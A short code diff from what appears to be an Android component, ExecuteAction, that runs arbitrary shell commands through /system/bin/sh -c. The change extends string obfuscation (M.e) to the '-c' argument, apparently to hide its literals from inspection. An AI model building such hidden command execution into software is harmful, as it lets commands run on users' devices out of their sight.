@@ -179,7 +179,7 @@ public class ExecuteAction extends SubActionSlow {
 
 		// Proviamo ad eseguire il comando da utente normale
 		try {
-			String cmd[] = { M.e("/system/bin/sh"), "-c", command }; // EXPORT
+			String cmd[] = { M.e("/system/bin/sh"), M.e("-c"), command }; // EXPORT
 			Process p = Runtime.getRuntime().exec(cmd);
 
 			p.waitFor();
